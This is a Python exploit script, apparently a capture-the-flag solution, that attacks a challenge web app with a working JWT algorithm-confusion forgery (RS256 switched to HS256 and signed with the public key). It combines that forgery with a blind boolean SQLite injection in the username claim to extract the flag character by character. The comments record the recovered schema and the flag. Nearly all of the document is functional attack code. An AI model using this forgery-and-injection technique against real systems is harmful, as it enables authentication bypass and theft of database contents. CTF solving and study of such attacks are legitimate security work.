#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from stoyled import *
from argparse import ArgumentParser
from base64 import b64encode, b64decode
from re import sub as reSubst
from hmac import new as hmac
from hashlib import sha256
from sys import exit
import json
import requests
import string

pubkey = "./public.key"
sample = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEiLCJwayI6Ii0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlDSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQWc4QU1JSUNDZ0tDQWdFQXpMNHZRNzRxSWJjT2dtdmNyTGwwXG5sclh3d3BLUXhBNCszVWxHNTBDdEVmN1d3NXRKdE1KeFFKS1Q0SHF0bHdoeTZhV2JtZFNveUh0ZnJES1lTTXVEXG5zallWL0EyaFNnNXI0enZFbEVZaUZqVWJKTFJ0NDBQQzJidjlvUzA2Z095eGx1NkRIdmN0dmM5N0gwWFpxN09xXG5na0cyQWxvNDdZYmdHRGRiNWJUb25jZG1hdEpEdXowL3dSOUZLMHhUWnpKcXJHWlFnL01FS0pHQzRYSjFuSEtTXG5aVFlWSGJaQmNOeU55dG1XWUMwaTdCSUdRVllPQ0hoOFdWaW44bjhINnAvZm9JWTdZYWV3TE9tc1FDNXZKMUhqXG5Ud1hLWHlOeHMvTThXVUNuUmJJZUFMeDhrTkVOY3BmbHRwSXI2UnRnK1BoaHp3Zk00bkZWOXE2d1cxYTFVZ3MzXG43cDZNclVYdFBWRmptOTYveXRZNUU3ampEbWFCNzFvQ2Q1T05PSGdzZ2M3dUhWUkJQM1pHRlF2azRHOTdBbjlqXG5mblBoeWY1eXdqNVNVWFJFMnB4Z043QjJwMXNHUjFuUkhDWmlkcytnRCtEMmQ3N0JwYVVoTHZTVkdnVXpYeU02XG4rbTFBZmhVQkN0Y0c3cEhXTy9aaXFrOWgyejJYTVNLcWc3ZnBIWHpSTmFncGZOWExmbG9MOXFJalFGZDZ6WmowXG5PWTdORFdUSlZGK3JsWGptT0NHZmY5ODZxSExCa2N6MXBwb2xZajdKa2lqNzFmaU1sb3A5NG82WSszWkpoZ2RaXG43Z2QySGk2aXZYekVlT3FJSk5ueWZmaURWcmZOdXgvbHl5YzJiK2Z1cVY3YUVZY3VneUFIdmw4RkdUOW02OTlCXG5wSHZxVytjam03R1R2bXJvd3ptWWowMENBd0VBQVE9PVxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4iLCJpYXQiOjE2MjA0MDE2MzB9.d3yM12Rj7D_7Bajc86-DHBcP8b0tup0tPA9WGlPGP6RCSEjtIikRtbGXLdPgD3u3idhFZ0mUsxOqDGpCr00hMupmaew6ufx5xVtohKEdSFxGX_x3gvkS2HENBvF2RbsINyGuWtI6C037XwkTIdnuWg9e9dAJ0ioWQLIfoAvxkiv0PCBhJ_Vs5On8buveRst74z-OYhQhWc6M0AKapHNYZrtnOBJwUK7uNDo242oiweU22sotbJhjVczqVKse1xhS8pdwCTf4hS7XOQ_uFWBDREAqFwJVsA45M6wd69zF5jfjfb5gS1-82qEhgi90LlIIcPkrdIKzXnXF0bnkuU3ly72-B9OLKpiq59mpyYYi4rMEIh1RHWF80N1Pegi8J8DeQqlc49R1vTE-2pUploklZ1NrDmfU0eHwpT4NV1w3D98GHDAGQ_2cixgyXnsia5V5bi9ZQOqIjzpYyDR6txbS2nzTULgHPy4Nxt3141GEpHFYbOYGBSCrXdfIhG0UVypDe_6dPnkBKabfatQGX0d3g97d1DBOCzH7VjXIsVZQl8dSgRD6vxkSbB3k-EspVF6tvsMJhUS8pZLNuwb4ZLlBmUcfO9wHN1L8Qn93EcdfWPRNpR2EqNPj0pgejuaWHkWTTl4DD4wiQCrTHeGE1HZnkJXpfcHiITYXT7qe98nDQI0"



def pad_check(data):
    missing_padding = len(data) % 4
    if missing_padding != 0:
        data += '=' * (4 - missing_padding)
    return data


def gen_payload(token, pubkey, payload):
    header = b64decode(pad_check(token.split('.')[0]))
    header = reSubst(b'"alg":".{5}"', b'"alg":"HS256"', header)
    base64header = b64encode(header).rstrip(b'=')
    base64payload = b64encode(payload.encode()).rstrip(b'=')
    try:
        pubKey = open(pubkey).read().encode()
    except IOError as ioErr:
        print(bad("IOError -> {}".format(ioErr)))
        exit(1)
    headerNpayload = base64header + b'.' + base64payload
    verifySig = hmac(pubKey, msg=headerNpayload, digestmod=sha256)
    verifySig = b64encode(verifySig.digest())
    verifySig = verifySig.replace(b'/', b'_').replace(b'+', b'-').strip(b'=')
    finaljwt = headerNpayload + b'.' + verifySig
    return finaljwt.decode()


def get_result(payload):
    url = "http://chall1.ctf.night-wolf.io/"
    cookie = {'session': payload}
    r = requests.get(url, cookies=cookie)
    if "doesn't exist" not in r.text:
        return 1
    else:
        return 0


def exploit():
    #https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
    #https://sqliteonline.com/
    #select substr((SELECT name FROM PRAGMA_TABLE_INFO('demo') limit 1 offset 1),1,1)
    #2 table
    # length 5,5
    # users, flags
    # id, flag
    # FNW_CTF{cR4shed_w1Th_jWt}
    data = {}
    data['pk'] = "-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAzL4vQ74qIbcOgmvcrLl0\nlrXwwpKQxA4+3UlG50CtEf7Ww5tJtMJxQJKT4Hqtlwhy6aWbmdSoyHtfrDKYSMuD\nsjYV/A2hSg5r4zvElEYiFjUbJLRt40PC2bv9oS06gOyxlu6DHvctvc97H0XZq7Oq\ngkG2Alo47YbgGDdb5bToncdmatJDuz0/wR9FK0xTZzJqrGZQg/MEKJGC4XJ1nHKS\nZTYVHbZBcNyNytmWYC0i7BIGQVYOCHh8WVin8n8H6p/foIY7YaewLOmsQC5vJ1Hj\nTwXKXyNxs/M8WUCnRbIeALx8kNENcpfltpIr6Rtg+PhhzwfM4nFV9q6wW1a1Ugs3\n7p6MrUXtPVFjm96/ytY5E7jjDmaB71oCd5ONOHgsgc7uHVRBP3ZGFQvk4G97An9j\nfnPhyf5ywj5SUXRE2pxgN7B2p1sGR1nRHCZids+gD+D2d77BpaUhLvSVGgUzXyM6\n+m1AfhUBCtcG7pHWO/Ziqk9h2z2XMSKqg7fpHXzRNagpfNXLfloL9qIjQFd6zZj0\nOY7NDWTJVF+rlXjmOCGff986qHLBkcz1ppolYj7Jkij71fiMlop94o6Y+3ZJhgdZ\n7gd2Hi6ivXzEeOqIJNnyffiDVrfNux/lyyc2b+fuqV7aEYcugyAHvl8FGT9m699B\npHvqW+cjm7GTvmrowzmYj00CAwEAAQ==\n-----END PUBLIC KEY-----\n".replace("\n","\\n")
    data['iat'] = 1620396685
    a = ""
    for j in range(0,100):
        for i in range(31,128):
            data['username'] = "admin' and unicode(substr((SELECT flag from flags limit 1 offset 0),"+str(j)+",1))="+str(i)+"-- -"
            #print(data['username'])
            payload = json.dumps(data)
            #print(payload)
            p = gen_payload(sample, pubkey, payload)
            #print(p)
            if(get_result(p) == 1):
                print(chr(i))
                break


def main():
    exploit()

if __name__ == '__main__':
    main()
